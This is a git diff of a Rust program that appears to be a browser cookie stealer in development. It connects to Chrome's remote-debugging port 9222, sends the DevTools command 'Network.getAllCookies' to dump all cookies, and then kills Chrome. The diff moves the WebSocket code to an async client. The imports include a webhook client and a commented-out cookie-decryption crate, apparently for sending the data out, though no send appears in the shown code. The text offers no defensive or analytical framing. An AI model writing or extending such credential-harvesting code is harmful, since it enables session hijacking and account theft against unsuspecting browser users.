@@ -3,12 +3,14 @@ use std::{env, fs};
 //use decrypt_cookies::{browser::info::ChromiumInfo, Browser, ChromiumBuilder};
 use dirs::home_dir;
 use dotenv::dotenv;
+use futures_util::{SinkExt, StreamExt};
 use serde_json::json;
 use serde_json::Value;
 use terminal_size::{terminal_size, Height, Width};
+use tokio_tungstenite::{connect_async, tungstenite};
+use web_sys;
 use webhook::client::WebhookClient;
 use websocket::{ClientBuilder, Message};
-use web_sys;
 
 const OS: &str = env::consts::OS;
 const DEBUG_PORT: u32 = 9222;
@@ -28,21 +30,39 @@ pub async fn main() -> Result<(), reqwest::Error> {
     let url = get_debug_ws_url().await;
 
     dbg!("{}", &url);
-    println!("{}", url);
-    let mut client = ClientBuilder::new(&url)
-        .unwrap()
-        .connect_insecure()
-        .unwrap();
-    let payload = json!({
-        "id": 1,
-        "method": "Network.getAllCookies"
-    })
-    .to_string();
-    client.send_message(&Message::text(payload)).unwrap();
-    if let Ok(message) = client.recv_message() {
-        println!("Received: {:?}", message);
+    // let mut client = ClientBuilder::new(&url)
+    //     .unwrap()
+    //     .connect_insecure()
+    //     .unwrap();
+    // let payload = json!({
+    //     "id": 1,
+    //     "method": "Network.getAllCookies"
+    // })
+    // .to_string();
+    // client.send_message(&Message::text(payload)).unwrap();
+    // if let Ok(message) = client.recv_message() {
+    //     println!("Received: {:?}", message);
+    // }
+    // let _ = client.shutdown();
+    let (ws_stream, _) = connect_async(url).await.unwrap();
+    println!("Connected to WebSocket!");
+    let (mut sink, mut stream) = ws_stream.split();
+
+    sink.send(tungstenite::Message::text(
+        json!({
+            "id": 1,
+            "method": "Network.getAllCookies"
+        })
+        .to_string(),
+    ))
+    .await
+    .expect("ln 52");
+    if let Some(response) = stream.next().await {
+        match response {
+            Ok(msg) => println!("Received: {:?}", msg),
+            Err(e) => eprintln!("Error receiving message: {:?}", e),
+        }
     }
-    let _ = client.shutdown();
     kill_chrome();
     Ok(())
 }
@@ -55,7 +75,7 @@ async fn get_debug_ws_url() -> String {
         .await
         .unwrap();
     dbg!("{:#?}", &body);
-    let json_res:Value = serde_json::from_str(&body).unwrap();
+    let json_res: Value = serde_json::from_str(&body).unwrap();
     let websocket_debugger_url = json_res[0]["webSocketDebuggerUrl"].to_string();
     println!("{}", websocket_debugger_url);
     websocket_debugger_url
